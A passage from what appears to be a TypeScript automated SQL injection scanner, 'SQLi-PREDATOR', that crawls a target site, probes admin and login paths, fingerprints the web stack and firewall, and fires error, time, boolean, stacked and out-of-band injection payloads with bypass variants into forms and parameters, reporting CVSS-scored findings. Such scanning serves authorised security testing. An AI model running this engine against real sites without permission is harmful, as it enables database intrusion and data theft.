        if (!existing || f.confidence > existing.confidence) {
            methodGroups.set(key, f);
        }
    }

    // For STATUS_CODE_ANOMALY and CONTENT_DIFF, only keep if no stronger finding for same param
    const confirmed = new Set<string>();
    for (const [key, f] of methodGroups.entries()) {
        if (f.detectionMethod !== "STATUS_CODE_ANOMALY" && f.detectionMethod !== "CONTENT_DIFF") {
            confirmed.add(`${f.url}|${f.parameter}`);
        }
    }

    const result: SQLiFinding[] = [];
    for (const [key, f] of methodGroups.entries()) {
        const paramKey = `${f.url}|${f.parameter}`;
        if ((f.detectionMethod === "STATUS_CODE_ANOMALY" || f.detectionMethod === "CONTENT_DIFF") && confirmed.has(paramKey)) {
            // Skip weak-signal findings when stronger methods already confirmed this param
            continue;
        }
        result.push(f);
    }

    // Sort by severity then confidence
    const SEVERITY_ORDER: Record<string, number> = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 };
    result.sort((a, b) => {
        const sevDiff = (SEVERITY_ORDER[a.severity] ?? 5) - (SEVERITY_ORDER[b.severity] ?? 5);
        if (sevDiff !== 0) return sevDiff;
        return b.confidence - a.confidence;
    });

    return result;
}

// ─── Headers Helper ───

function buildHeaders(config: ScanProfile): Record<string, string> {
    const headers: Record<string, string> = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    };
    if (config.authCookie) headers["Cookie"] = config.authCookie;
    if (config.authCreds) {
        const encoded = Buffer.from(config.authCreds).toString("base64");
        headers["Authorization"] = `Basic ${encoded}`;
    }
    return headers;
}

// ─── Form Parser ───

interface ParsedForm {
    action: string;
    method: string;
    inputs: Array<{ name: string; type: string; value: string }>;
    priority: "high" | "medium" | "low";
}

function getFormPriority(action: string, inputs: Array<{ name: string; type: string }>): "high" | "medium" | "low" {
    const lowerAction = action.toLowerCase();
    const HIGH_PRIORITY_PATHS = ["login", "search", "admin", "user", "product", "item", "query", "find", "id=", "page=", "cat=", "sort=", "filter=", "order=", "where="];
    const inputNames = inputs.map(i => i.name.toLowerCase());
    const HIGH_PRIORITY_INPUTS = ["id", "user", "username", "email", "password", "search", "q", "query", "term", "keyword", "order", "sort", "category", "page", "item", "product"];
    const hasPasswordField = inputs.some(i => i.type === "password");

    if (hasPasswordField || HIGH_PRIORITY_PATHS.some(p => lowerAction.includes(p))) return "high";
    if (inputNames.some(n => HIGH_PRIORITY_INPUTS.includes(n))) return "high";
    if (inputs.length > 0) return "medium";
    return "low";
}

function parseForms(html: string, pageUrl: string): ParsedForm[] {
    const forms: ParsedForm[] = [];
    const formBlockRegex = /<form([^>]*)>([\s\S]*?)<\/form>/gi;
    let formMatch;

    while ((formMatch = formBlockRegex.exec(html)) !== null) {
        const attrs = formMatch[1];
        const body = formMatch[2];

        const actionMatch = /action=["']([^"']*)["']/i.exec(attrs);
        let action = actionMatch ? actionMatch[1] : "";
        if (!action || action === "#") {
            action = pageUrl;
        } else if (!action.startsWith("http")) {
            try { action = new URL(action, pageUrl).href; } catch { action = pageUrl; }
        }

        const methodMatch = /method=["']([^"']*)["']/i.exec(attrs);
        const method = (methodMatch ? methodMatch[1] : "GET").toUpperCase();

        const inputs: Array<{ name: string; type: string; value: string }> = [];

        // <input>
        const inputRegex = /<input([^>]*)>/gi;
        let imatch;
        while ((imatch = inputRegex.exec(body)) !== null) {
            const iattrs = imatch[1];
            const nameMatch = /name=["']([^"']*)["']/i.exec(iattrs);
            if (!nameMatch) continue;
            const type = /type=["']([^"']*)["']/i.exec(iattrs)?.[1]?.toLowerCase() || "text";
            // Skip hidden/submit/button/checkbox/radio — not injection targets
            if (["submit", "button", "image", "file", "reset"].includes(type)) continue;
            const value = /value=["']([^"']*)["']/i.exec(iattrs)?.[1] || "";
            inputs.push({ name: nameMatch[1], type, value });
        }

        // <select>
        const selectRegex = /<select([^>]*)>/gi;
        let smatch;
        while ((smatch = selectRegex.exec(body)) !== null) {
            const nameMatch = /name=["']([^"']*)["']/i.exec(smatch[1]);
            if (!nameMatch) continue;
            const optionMatch = /<option[^>]*value=["']([^"']*)["']/i.exec(body.slice(smatch.index));
            inputs.push({ name: nameMatch[1], type: "select", value: optionMatch?.[1] || "1" });
        }

        // <textarea>
        const textareaRegex = /<textarea([^>]*)>/gi;
        let tmatch;
        while ((tmatch = textareaRegex.exec(body)) !== null) {
            const nameMatch = /name=["']([^"']*)["']/i.exec(tmatch[1]);
            if (!nameMatch) continue;
            inputs.push({ name: nameMatch[1], type: "textarea", value: "test" });
        }

        if (inputs.length > 0) {
            forms.push({ action, method, inputs, priority: getFormPriority(action, inputs) });
        }
    }

    return forms;
}

// ─── Technology Fingerprinting ───

function fingerprintTechnology(headers: Headers, body: string): TechStackInfo {
    const info: TechStackInfo = {};

    const server = headers.get("server") || "";
    if (server) info.server = server;

    const xPowered = headers.get("x-powered-by") || "";
    if (xPowered.toLowerCase().includes("php")) info.language = "PHP";
    else if (xPowered.toLowerCase().includes("asp")) info.language = "ASP.NET";
    else if (xPowered.toLowerCase().includes("express")) info.framework = "Express.js";

    // Cookie-based DB hints
    const setCookie = headers.get("set-cookie") || "";
    if (setCookie.toLowerCase().includes("phpsessid")) {
        if (!info.language) info.language = "PHP";
    }
    if (setCookie.toLowerCase().includes("jsessionid")) {
        if (!info.framework) info.framework = "Java/Servlet";
    }
    if (setCookie.toLowerCase().includes("asp.net_sessionid")) {
        if (!info.language) info.language = "ASP.NET";
    }

    // WAF detection
    const cfRay = headers.get("cf-ray");
    if (cfRay) info.waf = "Cloudflare";
    const xWaf = headers.get("x-waf") || headers.get("x-firewall-protection") || "";
    if (xWaf) info.waf = xWaf;

    // Body heuristics
    const lowerBody = body.toLowerCase().slice(0, 5000);
    if (lowerBody.includes("wp-content") || lowerBody.includes("wordpress")) info.framework = "WordPress";
    else if (lowerBody.includes("joomla")) info.framework = "Joomla";
    else if (lowerBody.includes("drupal")) info.framework = "Drupal";
    else if (lowerBody.includes("laravel")) info.framework = "Laravel";
    else if (lowerBody.includes("django")) info.framework = "Django";

    return info;
}

// ─── URL Priority Scorer ───

function scoreUrlPriority(url: string): "high" | "medium" | "low" {
    const HIGH_SIGNALS = ["login", "signin", "admin", "dashboard", "search", "query", "find", "user", "profile", "account", "order", "product", "item", "cat", "category", "id=", "page=", "sort=", "filter=", "q=", "s="];
    const lower = url.toLowerCase();
    if (HIGH_SIGNALS.some(s => lower.includes(s))) return "high";
    const parsedParams = new URL(url).searchParams;
    if ([...parsedParams.keys()].length > 0) return "medium";
    return "low";
}

// ─── Enhanced Crawler with Enumeration ───

interface CrawlParam {
    baseUrl: string;
    name: string;
    value: string;
    originalUrl?: string;
    allParams?: Record<string, string>;
    priority: "high" | "medium" | "low";
}

const COMMON_PATHS = [
    "/robots.txt", "/sitemap.xml",
    "/admin", "/admin/", "/admin/login", "/administrator",
    "/login", "/login.php", "/signin", "/auth",
    "/search", "/search.php", "/find", "/query",
    "/user", "/users", "/profile", "/account",
    "/api", "/api/v1", "/api/v2",
    "/products", "/product", "/items", "/item",
    "/news", "/blog", "/posts", "/articles",
    "/contact", "/about",
    "/wp-admin", "/wp-login.php",
    "/index.php", "/home.php",
];

async function crawlTarget(
    target: string,
    config: ScanProfile,
    authHeaders: Record<string, string>,
    log: (msg: string) => void
): Promise<{ forms: ParsedForm[]; params: CrawlParam[]; techStack: TechStackInfo; discoveredPaths: string[] }> {
    const forms: ParsedForm[] = [];
    const params: CrawlParam[] = [];
    const visited = new Set<string>();
    const discoveredPaths: string[] = [];
    let techStack: TechStackInfo = {};

    const baseOrigin = (() => {
        try { return new URL(target).origin; } catch { return ""; }
    })();

    // ── Extract params from target URL itself ──
    try {
        const parsed = new URL(target);
        const allParams: Record<string, string> = {};
        parsed.searchParams.forEach((value, name) => { allParams[name] = value; });

        if (Object.keys(allParams).length > 0) {
            for (const [name, value] of Object.entries(allParams)) {
                params.push({
                    baseUrl: parsed.origin + parsed.pathname,
                    name,
                    value,
                    originalUrl: target,
                    allParams,
                    priority: scoreUrlPriority(target),
                });
                log(`  Target URL param: ${name}=${value}`);
            }
        }
    } catch { }

    // ── robots.txt & sitemap.xml discovery ──
    async function fetchRobotsSitemap() {
        const robotsUrl = `${baseOrigin}/robots.txt`;
        try {
            const resp = await fetch(robotsUrl, { headers: authHeaders, signal: AbortSignal.timeout(8000) });
            if (resp.ok) {
                const text = await resp.text();
                const lines = text.split("\n");
                for (const line of lines) {
                    const trimmed = line.trim();
                    if (trimmed.startsWith("Disallow:") || trimmed.startsWith("Allow:") || trimmed.startsWith("Sitemap:")) {
                        const parts = trimmed.split(":").slice(1).join(":").trim();
                        if (parts && parts !== "/") {
                            const fullUrl = parts.startsWith("http") ? parts : `${baseOrigin}${parts.startsWith("/") ? "" : "/"}${parts}`;
                            discoveredPaths.push(fullUrl);
                            log(`  robots.txt path: ${fullUrl}`);
                        }
                    }
                }
                log(`  robots.txt parsed: ${discoveredPaths.length} paths found`);
            }
        } catch { }

        const sitemapUrl = `${baseOrigin}/sitemap.xml`;
        try {
            const resp = await fetch(sitemapUrl, { headers: authHeaders, signal: AbortSignal.timeout(8000) });
            if (resp.ok) {
                const text = await resp.text();
                const locMatches = [...text.matchAll(/<loc>([^<]+)<\/loc>/gi)];
                for (const m of locMatches) {
                    const locUrl = m[1].trim();
                    if (locUrl.startsWith(baseOrigin)) {
                        discoveredPaths.push(locUrl);
                    }
                }
                log(`  sitemap.xml parsed: ${locMatches.length} URLs found`);
            }
        } catch { }
    }

    // ── JavaScript URL extraction ──
    function extractJsUrls(html: string, pageUrl: string): string[] {
        const urls: string[] = [];
        // Match fetch("/api/..."), axios.get('/...'), href: '/...', url: '/...'
        const patterns = [
            /fetch\(["'`]([^"'`]+)["'`]/gi,
            /axios\.\w+\(["'`]([^"'`]+)["'`]/gi,
            /\$\.(?:get|post|ajax)\(["'`]([^"'`]+)["'`]/gi,
            /href:\s*["'`]([^"'`]+)["'`]/gi,
            /url:\s*["'`]([^"'`]+)["'`]/gi,
            /["'`](\/[a-z0-9\-_\/\.]+\?[a-z0-9\-_=&%]+)["'`]/gi,
        ];
        for (const pat of patterns) {
            let m;
            while ((m = pat.exec(html)) !== null) {
                const raw = m[1];
                if (raw && !raw.startsWith("http") && raw.startsWith("/")) {
                    try {
                        urls.push(new URL(raw, pageUrl).href);
                    } catch { }
                } else if (raw && raw.startsWith(baseOrigin)) {
                    urls.push(raw);
                }
            }
        }
        return [...new Set(urls)];
    }

    // ── Main crawl function ──
    async function crawl(url: string, depth: number = 0) {
        if (depth > config.crawlDepth || visited.has(url)) return;
        visited.add(url);

        try {
            log(`  Crawling: ${url.slice(0, 80)}`);
            const resp = await fetch(url, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(10000) });
            const html = await resp.text();

            // Fingerprint on first page
            if (depth === 0) {
                techStack = fingerprintTechnology(resp.headers, html);
                if (Object.keys(techStack).length > 0) {
                    log(`  Tech stack detected: ${JSON.stringify(techStack)}`);
                }
            }

            // Parse forms
            const pageForms = parseForms(html, url);
            for (const form of pageForms) {
                const isDup = forms.some(
                    f => f.action === form.action && f.method === form.method &&
                        JSON.stringify(f.inputs.map(i => i.name).sort()) === JSON.stringify(form.inputs.map(i => i.name).sort())
                );
                if (!isDup) {
                    forms.push(form);
                    log(`  Form found [${form.method} ${form.action.slice(0, 60)}] priority=${form.priority} inputs=[${form.inputs.map(i => i.name).join(",")}]`);
                }
            }

            // Extract JS URLs
            const jsUrls = extractJsUrls(html, url);
            for (const jsUrl of jsUrls) {
                if (!visited.has(jsUrl) && jsUrl.startsWith(baseOrigin)) {
                    discoveredPaths.push(jsUrl);
                    log(`  JS-extracted URL: ${jsUrl.slice(0, 80)}`);
                }
            }

            // Follow <a href> links within same origin
            const linkRegex = /<a[^>]*href=["']([^"']*?)["'][^>]*>/gi;
            let match;
            while ((match = linkRegex.exec(html)) !== null) {
                const href = match[1];
                if (!href || href.startsWith("#") || href.startsWith("javascript:") || href.startsWith("mailto:") || href.startsWith("tel:")) continue;
                try {
                    const absoluteUrl = new URL(href, url).href;
                    if (!absoluteUrl.startsWith(baseOrigin)) continue;

                    // Extract URL params from links
                    const linkedParsed = new URL(absoluteUrl);
                    const linkedParams: Record<string, string> = {};
                    linkedParsed.searchParams.forEach((v, n) => { linkedParams[n] = v; });

                    for (const [n, v] of Object.entries(linkedParams)) {
                        if (!params.some(p => p.baseUrl === linkedParsed.origin + linkedParsed.pathname && p.name === n)) {
                            params.push({
                                baseUrl: linkedParsed.origin + linkedParsed.pathname,
                                name: n,
                                value: v,
                                originalUrl: absoluteUrl,
                                allParams: linkedParams,
                                priority: scoreUrlPriority(absoluteUrl),
                            });
                        }
                    }

                    await crawl(absoluteUrl, depth + 1);
                } catch { }
            }
        } catch (e: any) {
            log(`  [ERROR] Crawl failed ${url.slice(0, 60)}: ${e.message}`);
        }
    }

    // ── Common path probing ──
    async function probeCommonPaths() {
        const probePromises = COMMON_PATHS.map(async (path) => {
            const fullUrl = `${baseOrigin}${path}`;
            if (visited.has(fullUrl)) return;
            try {
                const resp = await fetch(fullUrl, { headers: authHeaders, signal: AbortSignal.timeout(5000), redirect: "follow" });
                if (resp.ok || resp.status === 403) { // 403 = exists but forbidden
                    discoveredPaths.push(fullUrl);
                    log(`  Common path found [${resp.status}]: ${fullUrl}`);
                    if (resp.ok && !visited.has(fullUrl)) {
                        await crawl(fullUrl, config.crawlDepth); // crawl but don't go deeper
                    }
                }
            } catch { }
        });
        // Run in controlled batches of 5
        for (let i = 0; i < probePromises.length; i += 5) {
            await Promise.all(probePromises.slice(i, i + 5));
        }
    }

    // ── Execute all discovery phases ──
    await crawl(target);
    await fetchRobotsSitemap();

    // Crawl discovered paths from robots/sitemap
    for (const discUrl of discoveredPaths.slice(0, 20)) {
        if (!visited.has(discUrl) && discUrl.startsWith(baseOrigin)) {
            await crawl(discUrl, 1);
        }
    }

    // Probe common paths if crawl depth >= 1
    if (config.crawlDepth >= 1) {
        await probeCommonPaths();
    }

    // Crawl JS-extracted URLs
    for (const jsUrl of discoveredPaths.filter(u => u.startsWith(baseOrigin) && !visited.has(u)).slice(0, 15)) {
        await crawl(jsUrl, 1);
    }

    // Sort discovered params by priority (high first)
    const PRIORITY_ORDER = { high: 0, medium: 1, low: 2 };
    params.sort((a, b) => PRIORITY_ORDER[a.priority] - PRIORITY_ORDER[b.priority]);
    forms.sort((a, b) => PRIORITY_ORDER[a.priority] - PRIORITY_ORDER[b.priority]);

    log(`  Enumeration complete: ${forms.length} forms, ${params.length} URL params, ${discoveredPaths.length} paths discovered`);

    return { forms, params, techStack, discoveredPaths };
}

// ─── Statistical Time-Based Detection ───

async function measureBaslineTiming(
    fetchFn: () => Promise<{ elapsed: number; status: number }>,
    samples: number,
    log: (msg: string) => void
): Promise<{ mean: number; stddev: number }> {
    const times: number[] = [];
    for (let i = 0; i < samples; i++) {
        try {
            const { elapsed } = await fetchFn();
            times.push(elapsed);
            await sleep(200);
        } catch { }
    }
    if (times.length === 0) return { mean: 1.0, stddev: 0.5 };
    const mean = times.reduce((a, b) => a + b, 0) / times.length;
    const variance = times.reduce((sum, t) => sum + Math.pow(t - mean, 2), 0) / times.length;
    const stddev = Math.sqrt(variance) || 0.1;
    log(`  Timing baseline: mean=${mean.toFixed(2)}s, stddev=${stddev.toFixed(2)}s (${times.length} samples)`);
    return { mean, stddev };
}

function computeZScore(measured: number, mean: number, stddev: number): number {
    if (stddev === 0) return measured > mean + 2 ? 10 : 0;
    return (measured - mean) / stddev;
}

// ─── Main Scan Function ───

export async function runScan(
    config: ScanProfile,
    onProgress: (phase: string, progress: number) => void
): Promise<{ findings: SQLiFinding[]; scanLog: string[]; enumeration: any }> {
    const allFindings: SQLiFinding[] = [];
    const scanLog: string[] = [];
    const target = config.targetUrl;
    const authHeaders = buildHeaders(config);

    function log(msg: string) {
        const ts = new Date().toISOString().slice(11, 19);
        const entry = `[${ts}] ${msg}`;
        scanLog.push(entry);
        console.log(`[PREDATOR] ${entry}`);
    }

    function createFinding(opts: {
        url: string;
        parameter: string;
        method: string;
        attackSurface: SQLiFinding["attackSurface"];
        detectionMethod: string;
        payload: Payload;
        bypass: BypassTechnique;
        dbHint: string;
        confidence: number;
        hasSqlErrors: boolean;
        errorSignatures: string[];
        errorWeight: number;
        timeDelayDetected: boolean;
        timeDelaySeconds: number;
        timingZScore: number;
        timingPValue: number;
        isBooleanPositive: boolean | null;
        oobInteractionId: string;
        contentDiff: number;
        baselineLength: number;
        testLength: number;
        baselineTime: number;
        testTime: number;
        rawResponseSnippet: string;
        formData?: Record<string, string>;
    }): SQLiFinding {
        const cvssScore = CVSS_BASE_SCORES[opts.detectionMethod] || 4.5;
        const severity = calculateSeverity(cvssScore);
        const confidenceLevel = getConfidenceLevel(opts.confidence);

        const partialFinding: Partial<SQLiFinding> = {
            url: opts.url,
            parameter: opts.parameter,
            detectionMethod: opts.detectionMethod,
            payloadUsed: opts.payload.value,
            dbTypeHint: opts.dbHint,
            errorSignatures: opts.errorSignatures,
            responseDifferencePercent: parseFloat(opts.contentDiff.toFixed(1)),
            timeDelaySeconds: opts.timeDelaySeconds,
            timingZScore: opts.timingZScore,
            baselineLength: opts.baselineLength,
            testLength: opts.testLength,
        };

        const isFormPost = opts.method === "POST";
        const pocRequest = buildPocRequest(
            opts.method,
            opts.url,
            opts.parameter,
            opts.payload.value,
            authHeaders,
            isFormPost,
            opts.formData
        );

        return {
            id: crypto.randomUUID().slice(0, 8),
            timestamp: new Date().toISOString(),
            url: opts.url,
            parameter: opts.parameter,
            vector: opts.method,
            attackSurface: opts.attackSurface,
            detectionMethod: opts.detectionMethod,
            payloadUsed: opts.payload.value,
            bypassTechnique: opts.bypass,
            dbTypeHint: opts.dbHint,
            confidence: parseFloat(opts.confidence.toFixed(2)),
            confidenceLevel,
            severity,
            cvssScore,
            hasSqlErrors: opts.hasSqlErrors,
            errorSignatures: opts.errorSignatures,
            timeDelayDetected: opts.timeDelayDetected,
            timeDelaySeconds: opts.timeDelaySeconds,
            timingZScore: opts.timingZScore,
            timingPValue: opts.timingPValue,
            isBooleanPositive: opts.isBooleanPositive,
            oobInteractionId: opts.oobInteractionId,
            responseDifferencePercent: parseFloat(opts.contentDiff.toFixed(1)),
            baselineLength: opts.baselineLength,
            testLength: opts.testLength,
            baselineTime: opts.baselineTime,
            testTime: opts.testTime,
            aiExplanation: generateExplanation({ ...partialFinding }),
            remediationSteps: generateRemediation(opts.detectionMethod, opts.dbHint),
            vulnerabilityClass: "SQL Injection",
            rawResponseSnippet: opts.rawResponseSnippet,
            pocRequest,
            cweId: CWE_MAP[opts.detectionMethod] || "CWE-89",
            owaspCategory: OWASP_CATEGORY,
            references: REFERENCES,
        };
    }

    // ─────────────────────────────────────────────────
    // Phase 1: Enumeration
    // ─────────────────────────────────────────────────
    onProgress("Phase 1: Enumerating attack surface", 3);
    log(`═══ SQLi-PREDATOR v5.0 Autonomous Engine ═══`);
    log(`Target: ${target}`);
    log(`Auth cookie: ${config.authCookie ? "YES (" + config.authCookie.slice(0, 30) + "...)" : "NONE"}`);
    log(`Test Headers: ${config.testAllHeaders ? "YES" : "NO"} | OOB Domain: ${config.oobDomain || "NONE"}`);
    log(`── Phase 1: Enumerating Attack Surface ──`);

    const crawlResults = await crawlTarget(target, config, authHeaders, log);
    const { forms, params, techStack, discoveredPaths } = crawlResults;

    log(`Enumeration complete: ${forms.length} forms (${forms.filter(f => f.priority === "high").length} high-priority), ${params.length} URL params (${params.filter(p => p.priority === "high").length} high-priority)`);
    log(`Tech stack: ${JSON.stringify(techStack)}`);
    log(`Discovered paths: ${discoveredPaths.length}`);

    onProgress("Phase 1: Enumeration complete", 15);

    // ─────────────────────────────────────────────────
    // Phase 2: Baselines
    // ─────────────────────────────────────────────────
    onProgress("Phase 2: Establishing baselines", 18);
    log(`── Phase 2: Establishing baselines ──`);
    const baselines = new Map<string, { status: number; length: number; hash: string; mean: number; stddev: number }>();

    for (const form of forms) {
        const key = `form:${form.action}:${form.method}`;
        if (baselines.has(key)) continue;
        try {
            const data: Record<string, string> = {};
            for (const inp of form.inputs) data[inp.name] = inp.value || "test";

            const { mean, stddev } = await measureBaslineTiming(async () => {
                const start = performance.now();
                let resp: Response;
                if (form.method === "GET") {
                    resp = await fetch(`${form.action}?${new URLSearchParams(data).toString()}`, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                } else {
                    resp = await fetch(form.action, { method: "POST", headers: { ...authHeaders, "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(data), redirect: "follow", signal: AbortSignal.timeout(15000) });
                }
                const text = await resp.text();
                return { elapsed: (performance.now() - start) / 1000, status: resp.status };
            }, Math.min(config.timeSamples, 2), log);

            let resp: Response;
            const start = performance.now();
            if (form.method === "GET") {
                resp = await fetch(`${form.action}?${new URLSearchParams(data).toString()}`, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
            } else {
                resp = await fetch(form.action, { method: "POST", headers: { ...authHeaders, "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(data), redirect: "follow", signal: AbortSignal.timeout(15000) });
            }
            const text = await resp.text();
            baselines.set(key, { status: resp.status, length: text.length, hash: simpleHash(text), mean, stddev });
            log(`  Baseline form [${form.method} ${form.action.slice(0, 50)}]: status=${resp.status}, len=${text.length}`);
        } catch (e: any) {
            log(`  Baseline form error: ${e.message}`);
        }
    }

    for (const param of params) {
        const key = `param:${param.baseUrl}:${param.name}`;
        if (baselines.has(key)) continue;
        try {
            const { mean, stddev } = await measureBaslineTiming(async () => {
                const start = performance.now();
                const resp = await fetch(param.originalUrl || `${param.baseUrl}?${param.name}=${encodeURIComponent(param.value)}`, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                await resp.text();
                return { elapsed: (performance.now() - start) / 1000, status: resp.status };
            }, Math.min(config.timeSamples, 2), log);

            const start = performance.now();
            const resp = await fetch(param.originalUrl || `${param.baseUrl}?${param.name}=${encodeURIComponent(param.value)}`, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
            const text = await resp.text();
            baselines.set(key, { status: resp.status, length: text.length, hash: simpleHash(text), mean, stddev });
            log(`  Baseline param [${param.name}]: status=${resp.status}, len=${text.length}, timing mean=${mean.toFixed(2)}s`);
        } catch (e: any) {
            log(`  Baseline param error: ${e.message}`);
        }
    }

    onProgress("Phase 2: Baselines established", 25);

    // ─────────────────────────────────────────────────
    // Phase 3: Form Parameter Testing
    // ─────────────────────────────────────────────────
    onProgress("Phase 3: Testing form parameters", 28);
    log(`── Phase 3: Testing form parameters (${forms.length} forms) ──`);

    // Build payload set: all base payloads + OOB + polymorphic variants
    const oobPayloads = buildOobPayloads(config.oobDomain);
    const ALL_PAYLOADS = [...BASE_PAYLOADS, ...oobPayloads];

    // Boolean pairs: map TRUE payload index -> FALSE payload index
    // Process boolean payloads in dedicated pairs
    const booleanTruePayloads = ALL_PAYLOADS.filter(p => p.category === "boolean_based_true");
    const nonBooleanPayloads = ALL_PAYLOADS.filter(p => p.category !== "boolean_based_true" && p.category !== "boolean_based_false");

    let testIndex = 0;
    const FORM_PROGRESS_START = 28;
    const FORM_PROGRESS_END = 60;

    for (const form of forms) {
        const baselineKey = `form:${form.action}:${form.method}`;
        const baseline = baselines.get(baselineKey);
        const formData: Record<string, string> = {};
        for (const inp of form.inputs) formData[inp.name] = inp.value || "test";

        for (const inputField of form.inputs) {
            log(`  Testing form field: "${inputField.name}" on ${form.action.slice(0, 60)} [${form.method}] priority=${form.priority}`);

            // ── Non-boolean tests ──
            for (const basePayload of nonBooleanPayloads) {
                const variants = generatePolymorphicVariants(basePayload, basePayload.category === "time_based");

                for (const { payload, bypass } of variants) {
                    try {
                        const data: Record<string, string> = { ...formData, [inputField.name]: payload.value };
                        let resp: Response;
                        const start = performance.now();

                        if (form.method === "GET") {
                            resp = await fetch(`${form.action}?${new URLSearchParams(data).toString()}`, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                        } else {
                            resp = await fetch(form.action, { method: "POST", headers: { ...authHeaders, "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(data), redirect: "follow", signal: AbortSignal.timeout(15000) });
                        }

                        const elapsed = (performance.now() - start) / 1000;
                        const text = await resp.text();

                        const { found: hasErrors, signatures, dbHint, totalWeight: errorWeight } = checkErrorSignatures(text);
                        const contentDiff = baseline ? (Math.abs(text.length - baseline.length) / (baseline.length || 1)) * 100 : 0;
                        const statusChanged = baseline ? (resp.status >= 500 && baseline.status < 400) : false;

                        // Statistical time-based check
                        const zScore = baseline ? computeZScore(elapsed, baseline.mean, baseline.stddev) : 0;
                        const isTimeBased = payload.category === "time_based" && elapsed > config.timeThreshold && zScore >= 2.5;

                        let detMethod = "";
                        if (hasErrors && errorWeight >= 2) detMethod = "ERROR_BASED";
                        else if (isTimeBased && zScore >= 2.5) detMethod = "TIME_BASED_STATISTICAL";
                        else if (payload.category === "union_probe" && contentDiff > 5) detMethod = "UNION_PROBE";
                        else if (payload.category === "stacked_query" && (isTimeBased || hasErrors)) detMethod = "STACKED_QUERY";
                        else if (payload.category === "oob_dns") detMethod = "OOB_DNS";
                        else if (payload.category === "oob_http") detMethod = "OOB_HTTP";
                        else if (statusChanged) detMethod = "STATUS_CODE_ANOMALY";
                        else if (contentDiff > 20) detMethod = "CONTENT_DIFF";

                        if (!detMethod) {
                            testIndex++;
                            continue;
                        }

                        const confidence = scoreConfidence({
                            hasErrors,
                            errorWeight,
                            timeDelay: isTimeBased,
                            timingZScore: zScore,
                            oobId: detMethod.startsWith("OOB") ? "oob-injected" : "",
                            booleanConfirmed: false,
                            contentDiff,
                            testStatus: resp.status,
                            baselineStatus: baseline?.status || 200,
                            signatures,
                            dbHint,
                        });

                        // Minimum confidence thresholds per method
                        const MIN_CONFIDENCE: Record<string, number> = {
                            ERROR_BASED: 0.40,
                            TIME_BASED_STATISTICAL: 0.45,
                            UNION_PROBE: 0.20,
                            STACKED_QUERY: 0.40,
                            OOB_DNS: 0.50,
                            OOB_HTTP: 0.50,
                            STATUS_CODE_ANOMALY: 0.15,
                            CONTENT_DIFF: 0.30,
                        };

                        if (confidence < (MIN_CONFIDENCE[detMethod] || 0.25)) {
                            testIndex++;
                            await sleep(config.requestDelay * 500);
                            continue;
                        }

                        const finding = createFinding({
                            url: form.action, parameter: inputField.name, method: form.method,
                            attackSurface: "form", detectionMethod: detMethod,
                            payload, bypass, dbHint, confidence,
                            hasSqlErrors: hasErrors, errorSignatures: signatures, errorWeight,
                            timeDelayDetected: isTimeBased, timeDelaySeconds: elapsed,
                            timingZScore: zScore, timingPValue: zScore >= 3 ? 0.001 : zScore >= 2 ? 0.05 : 0.1,
                            isBooleanPositive: null, oobInteractionId: detMethod.startsWith("OOB") ? "pending-verification" : "",
                            contentDiff, baselineLength: baseline?.length || 0, testLength: text.length,
                            baselineTime: baseline?.mean || 0, testTime: elapsed,
                            rawResponseSnippet: text.slice(0, 400), formData,
                        });

                        allFindings.push(finding);
                        log(`    ▸ FINDING: ${finding.severity} CVSS:${finding.cvssScore} conf:${(finding.confidence * 100).toFixed(0)}% ${detMethod} — ${inputField.name} via ${bypass}`);
                    } catch (e: any) {
                        log(`    [ERROR] ${inputField.name}: ${e.message}`);
                    }

                    testIndex++;
                    onProgress(`Phase 3: Testing forms [${testIndex}]`, Math.min(FORM_PROGRESS_START + (testIndex / 500) * (FORM_PROGRESS_END - FORM_PROGRESS_START), FORM_PROGRESS_END));
                    await sleep(config.requestDelay * 500);
                }
            }

            // ── Boolean pair testing ──
            for (const truePayload of booleanTruePayloads) {
                if (!truePayload.booleanPair) continue;
                const falsePayload: Payload = { ...truePayload, value: truePayload.booleanPair, category: "boolean_based_false", description: "Boolean FALSE pair" };

                try {
                    const trueData = { ...formData, [inputField.name]: truePayload.value };
                    const falseData = { ...formData, [inputField.name]: falsePayload.value };

                    const fetchForm = async (data: Record<string, string>) => {
                        const start = performance.now();
                        let resp: Response;
                        if (form.method === "GET") {
                            resp = await fetch(`${form.action}?${new URLSearchParams(data).toString()}`, { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                        } else {
                            resp = await fetch(form.action, { method: "POST", headers: { ...authHeaders, "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(data), redirect: "follow", signal: AbortSignal.timeout(15000) });
                        }
                        const text = await resp.text();
                        return { text, status: resp.status, elapsed: (performance.now() - start) / 1000 };
                    };

                    const trueResp = await fetchForm(trueData);
                    await sleep(config.requestDelay * 300);
                    const falseResp = await fetchForm(falseData);

                    const trueLen = trueResp.text.length;
                    const falseLen = falseResp.text.length;
                    const baseLen = baseline?.length || 0;
                    const diffTrueFalse = baseLen > 0 ? Math.abs(trueLen - falseLen) / baseLen * 100 : Math.abs(trueLen - falseLen) / (Math.max(trueLen, falseLen) || 1) * 100;

                    // Confirmed boolean: TRUE and FALSE produce different responses, and at least one differs from baseline
                    const booleanConfirmed = diffTrueFalse > 5 && (
                        (baseline && Math.abs(trueLen - baseline.length) > 10) ||
                        (baseline && Math.abs(falseLen - baseline.length) > 10) ||
                        Math.abs(trueLen - falseLen) > 50
                    );

                    if (booleanConfirmed) {
                        const confidence = scoreConfidence({
                            hasErrors: false, errorWeight: 0, timeDelay: false, timingZScore: 0,
                            oobId: "", booleanConfirmed: true, contentDiff: diffTrueFalse,
                            testStatus: trueResp.status, baselineStatus: baseline?.status || 200,
                            signatures: [], dbHint: "unknown",
                        });

